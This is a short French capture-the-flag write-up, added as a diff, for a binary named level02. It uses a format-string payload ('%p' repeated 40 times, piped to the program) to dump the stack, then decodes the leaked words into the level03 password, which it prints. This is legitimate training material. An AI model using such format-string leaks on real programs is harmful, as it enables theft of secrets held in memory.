@@ -1,0 +1,17 @@
+On voit que le programe level02 read le contenu du /user/level03/.pass. Il va ensuite un utilisateur et un password sur l'entree standard.
+Puis, il va comparer le contenu du level03/.pass et celui du password et ouvrir un shell avec les droits de level03 dans le cas ou la comparaison reussie.
+Dans le cas contraire, il affiche le user avec un printf et dit qu'il n'a pas acces.
+
+On voit donc que dans ce cas, on peut utiliser un format string exploit et afficher la stack.
+En lancant le programe avec:
+python -c 'print "%p " * 40' | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffe4d0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+, nous sommes en mesure d'afficher la stack. On remarque 5 groupements de 8 bytes entre 2 nils.
+(nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil).
+En rentrant ces valeurs dans un programe c pour obtenir leurs valeurs ascii et en les convertissant le little endian, on obtient:
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
